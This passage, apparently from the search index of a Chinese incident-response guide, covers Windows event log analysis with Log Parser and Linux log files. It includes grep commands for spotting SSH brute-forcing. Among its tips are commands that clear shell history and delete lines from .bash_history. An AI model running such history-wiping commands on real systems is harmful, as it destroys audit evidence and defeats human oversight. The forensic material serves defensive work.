\u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a4625\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e8b\u4ef6ID\uff1a4625\uff0c\u4e8b\u4ef6\u6570175904\uff0c\u5373\u7528\u6237\u767b\u5f55\u5931\u8d25\u4e86175904\u6b21\uff0c\u90a3\u4e48\u8fd9\u53f0\u670d\u52a1\u5668\u7ba1\u7406\u5458\u8d26\u53f7\u53ef\u80fd\u906d\u9047\u4e86\u66b4\u529b\u731c\u89e3\u3002 \u6848\u4f8b2\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u8ba1\u7b97\u673a\u5f00\u5173\u673a\u7684\u8bb0\u5f55\uff1a 1\u3001\u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b 2\u3001\u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u7cfb\u7edf\u201d**\uff0c\u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\uff1b 3\u3001\u5728\u7cfb\u7edf\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 \u5176\u4e2d\u4e8b\u4ef6ID 6006 ID6005\u3001 ID 6009\u5c31\u8868\u793a\u4e0d\u540c\u72b6\u6001\u7684\u673a\u5668\u7684\u60c5\u51b5\uff08\u5f00\u5173\u673a\uff09\u3002 6005 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u542f\u52a8\u3002(\u5f00\u673a) 6006 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u505c\u6b62\u3002(\u5173\u673a) 6009 \u4fe1\u606f EventLog \u6309ctrl\u3001alt\u3001delete\u952e(\u975e\u6b63\u5e38)\u5173\u673a \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a6005-6006\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e86\u4e24\u6761\u57282018/7/6 17:53:51\u5de6\u53f3\u7684\u8bb0\u5f55\uff0c\u4e5f\u5c31\u662f\u6211\u521a\u624d\u5bf9\u7cfb\u7edf\u8fdb\u884c\u91cd\u542f\u7684\u65f6\u95f4\u3002","title":"0x03 \u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x04-\u65e5\u5fd7\u5206\u6790\u5de5\u5177","text":"","title":"0x04 \u65e5\u5fd7\u5206\u6790\u5de5\u5177"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#log-parser","text":"Log Parser\uff08\u662f\u5fae\u8f6f\u516c\u53f8\u51fa\u54c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff0c\u5b83\u529f\u80fd\u5f3a\u5927\uff0c\u4f7f\u7528\u7b80\u5355\uff0c\u53ef\u4ee5\u5206\u6790\u57fa\u4e8e\u6587\u672c\u7684\u65e5\u5fd7\u6587\u4ef6\u3001XML \u6587\u4ef6\u3001CSV\uff08\u9017\u53f7\u5206\u9694\u7b26\uff09\u6587\u4ef6\uff0c\u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e8b\u4ef6\u65e5\u5fd7\u3001\u6ce8\u518c\u8868\u3001\u6587\u4ef6\u7cfb\u7edf\u3001Active Directory\u3002\u5b83\u53ef\u4ee5\u50cf\u4f7f\u7528 SQL \u8bed\u53e5\u4e00\u6837\u67e5\u8be2\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u628a\u5206\u6790\u7ed3\u679c\u4ee5\u5404\u79cd\u56fe\u8868\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 Log Parser 2.2\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser \u4f7f\u7528\u793a\u4f8b\uff1a https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 Logparser.exe \u2013i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" \u4f7f\u7528Log Parser\u5206\u6790\u65e5\u5fd7 1\u3001\u67e5\u8be2\u767b\u5f55\u6210\u529f\u7684\u4e8b\u4ef6 \u767b\u5f55\u6210\u529f\u7684\u6240\u6709\u4e8b\u4ef6 LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" \u6307\u5b9a\u767b\u5f55\u65f6\u95f4\u8303\u56f4\u7684\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624\" \u63d0\u53d6\u767b\u5f55\u6210\u529f\u7684\u7528\u6237\u540d\u548cIP\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2\u3001\u67e5\u8be2\u767b\u5f55\u5931\u8d25\u7684\u4e8b\u4ef6 \u767b\u5f55\u5931\u8d25\u7684\u6240\u6709\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" \u63d0\u53d6\u767b\u5f55\u5931\u8d25\u7528\u6237\u540d\u8fdb\u884c\u805a\u5408\u7edf\u8ba1\uff1a LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3\u3001\u7cfb\u7edf\u5386\u53f2\u5f00\u5173\u673a\u8bb0\u5f55\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\"","title":"Log Parser"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#logparser-lizard","text":"\u5bf9\u4e8eGUI\u73af\u5883\u7684Log Parser Lizard\uff0c\u5176\u7279\u70b9\u662f\u6bd4\u8f83\u6613\u4e8e\u4f7f\u7528\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u8bb0\u5fc6\u7e41\u7410\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u8981\u505a\u597d\u8bbe\u7f6e\uff0c\u5199\u597d\u57fa\u672c\u7684SQL\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5\u76f4\u89c2\u7684\u5f97\u5230\u7ed3\u679c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.lizard-labs.com/log_parser_lizard.aspx \u4f9d\u8d56\u5305\uff1aMicrosoft .NET Framework 4 .5\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=42642 \u67e5\u8be2\u6700\u8fd1\u7528\u6237\u767b\u5f55\u60c5\u51b5\uff1a","title":"LogParser Lizard"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#event-log-explorer","text":"Event Log Explorer\u662f\u4e00\u6b3e\u975e\u5e38\u597d\u7528\u7684Windows\u65e5\u5fd7\u5206\u6790\u5de5\u5177\u3002\u53ef\u7528\u4e8e\u67e5\u770b\uff0c\u76d1\u89c6\u548c\u5206\u6790\u8ddf\u4e8b\u4ef6\u8bb0\u5f55\uff0c\u5305\u62ec\u5b89\u5168\uff0c\u7cfb\u7edf\uff0c\u5e94\u7528\u7a0b\u5e8f\u548c\u5176\u4ed6\u5fae\u8f6fWindows \u7684\u8bb0\u5f55\u88ab\u8bb0\u8f7d\u7684\u4e8b\u4ef6\uff0c\u5176\u5f3a\u5927\u7684\u8fc7\u6ee4\u529f\u80fd\u53ef\u4ee5\u5feb\u901f\u7684\u8fc7\u6ee4\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://event-log-explorer.en.softonic.com/ \u53c2\u8003\u94fe\u63a5\uff1a Windows\u65e5\u5fd7\u5206\u6790 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","title":"Event Log Explorer"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u00b6 0x00 \u524d\u8a00 \u00b6 Linux\u7cfb\u7edf\u62e5\u6709\u975e\u5e38\u7075\u6d3b\u548c\u5f3a\u5927\u7684\u65e5\u5fd7\u529f\u80fd\uff0c\u53ef\u4ee5\u4fdd\u5b58\u51e0\u4e4e\u6240\u6709\u7684\u64cd\u4f5c\u8bb0\u5f55\uff0c\u5e76\u53ef\u4ee5\u4ece\u4e2d\u68c0\u7d22\u51fa\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u3002 \u672c\u6587\u7b80\u4ecb\u4e00\u4e0bLinux\u7cfb\u7edf\u65e5\u5fd7\u53ca\u65e5\u5fd7\u5206\u6790\u6280\u5de7\u3002 0x01 \u65e5\u5fd7\u7b80\u4ecb \u00b6 \u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u65e5\u5fd7\uff1a \u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a/var/log/btmp //lastb \u6700\u540e\u4e00\u6b21\u767b\u5f55\uff1a/var/log/lastlog //lastlog \u767b\u5f55\u6210\u529f\u8bb0\u5f55: /var/log/wtmp //last \u767b\u5f55\u65e5\u5fd7\u8bb0\u5f55\uff1a/var/log/secure \u200b \u76ee\u524d\u767b\u5f55\u7528\u6237\u4fe1\u606f\uff1a/var/run/utmp //w\u3001who\u3001users \u200b \u5386\u53f2\u547d\u4ee4\u8bb0\u5f55\uff1ahistory \u200b \u4ec5\u6e05\u7406\u5f53\u524d\u7528\u6237\uff1a history -c 0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 A\u3001\u5e38\u7528\u7684shell\u547d\u4ee4 \u00b6 Linux\u4e0b\u5e38\u7528\u7684shell\u547d\u4ee4\u5982\uff1afind\u3001grep \u3001egrep\u3001awk\u3001sed \u5c0f\u6280\u5de7\uff1a 1\u3001grep\u663e\u793a\u524d\u540e\u51e0\u884c\u4fe1\u606f: \u200b \u6807\u51c6unix/linux\u4e0b\u7684grep\u901a\u8fc7\u4e0b\u9762\u53c3\u6570\u63a7\u5236\u4e0a\u4e0b\u6587\uff1a \u200b grep -C 5 foo file \u663e\u793afile\u6587\u4ef6\u91cc\u5339\u914dfoo\u5b57\u4e32\u90a3\u884c\u4ee5\u53ca\u4e0a\u4e0b5\u884c \u200b grep -B 5 foo file \u663e\u793afoo\u53ca\u524d5\u884c \u200b grep -A 5 foo file \u663e\u793afoo\u53ca\u540e5\u884c \u200b \u67e5\u770bgrep\u7248\u672c\u53f7\u7684\u65b9\u6cd5\u662f \u200b grep -V 2\u3001grep \u67e5\u627e\u542b\u6709\u67d0\u5b57\u7b26\u4e32\u7684\u6240\u6709\u6587\u4ef6 grep -rn \"hello,world!\" * : \u8868\u793a\u5f53\u524d\u76ee\u5f55\u6240\u6709\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u67d0\u4e2a\u6587\u4ef6\u540d -r \u662f\u9012\u5f52\u67e5\u627e -n \u662f\u663e\u793a\u884c\u53f7 -R \u67e5\u627e\u6240\u6709\u6587\u4ef6\u5305\u542b\u5b50\u76ee\u5f55 -i \u5ffd\u7565\u5927\u5c0f\u5199 3\u3001\u5982\u4f55\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u7684\u67d0\u51e0\u884c\uff1a cat input_file | tail -n +1000 | head -n 2000 #\u4ece\u7b2c1000\u884c\u5f00\u59cb\uff0c\u663e\u793a2000\u884c\u3002\u5373\u663e\u793a1000~2999\u884c 4\u3001find /etc -name init //\u5728\u76ee\u5f55/etc\u4e2d\u67e5\u627e\u6587\u4ef6init 5\u3001\u53ea\u662f\u663e\u793a/etc/passwd\u7684\u8d26\u6237 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F\u6307\u5b9a\u57df\u5206\u9694\u7b26\u4e3a':'\uff0c\u5c06\u8bb0\u5f55\u6309\u6307\u5b9a\u7684\u57df\u5206\u9694\u7b26\u5212\u5206\u57df\uff0c\u586b\u5145\u57df\uff0c\u200b$0\u5219\u8868\u793a\u6240\u6709\u57df,$1\u8868\u793a\u7b2c\u4e00\u4e2a\u57df,\u200b$n\u8868\u793a\u7b2cn\u4e2a\u57df\u3002 6\u3001sed -i '153,$d' .bash_history \u5220\u9664\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u53ea\u4fdd\u7559\u524d153\u884c B\u3001\u65e5\u5fd7\u5206\u6790\u6280\u5de7 \u00b6 A\u3001/var/log/secure 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2\u3001/var/log/yum.log \u8f6f\u4ef6\u5b89\u88c5\u5347\u7ea7\u5378\u8f7d\u65e5\u5fd7\uff1a ~ yum install gcc yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 ~","title":"\u7b2c2\u7bc7\uff1aLinux\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#\u7b2c2\u7bc7linux\u65e5\u5fd7\u5206\u6790","text":"","title":"\u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x00-\u524d\u8a00","text":"Linux\u7cfb\u7edf\u62e5\u6709\u975e\u5e38\u7075\u6d3b\u548c\u5f3a\u5927\u7684\u65e5\u5fd7\u529f\u80fd\uff0c\u53ef\u4ee5\u4fdd\u5b58\u51e0\u4e4e\u6240\u6709\u7684\u64cd\u4f5c\u8bb0\u5f55\uff0c\u5e76\u53ef\u4ee5\u4ece\u4e2d\u68c0\u7d22\u51fa\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u3002 \u672c\u6587\u7b80\u4ecb\u4e00\u4e0bLinux\u7cfb\u7edf\u65e5\u5fd7\u53ca\u65e5\u5fd7\u5206\u6790\u6280\u5de7\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC2%E7%AF%87%EF%BC%9ALinux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-\u65e5\u5fd7\u7b80\u4ecb","text":"\u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u65e5\u5fd7\uff1a \u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a/var/log/btmp //lastb \u6700\u540e\u4e00\u6b21\u767b\u5f55\uff1a/var/log/lastlog //lastlog \u767b\u5f55\u6210\u529f\u8bb0\u5f55: /var/log/wtmp //last \u767b\u5f55\u65e5\u5fd7\u8bb0\u5f55\uff1a/var/log/secure \u200b \u76ee\u524d\u767b\u5f55\u7528\u6237\u4fe1\u606f\uff1a/var/run/utmp //w\u3001who\u3001users \u200b \u5386\u53f2\u547d\u4ee4\u8bb0\u5f55\uff1ahistory \u200b 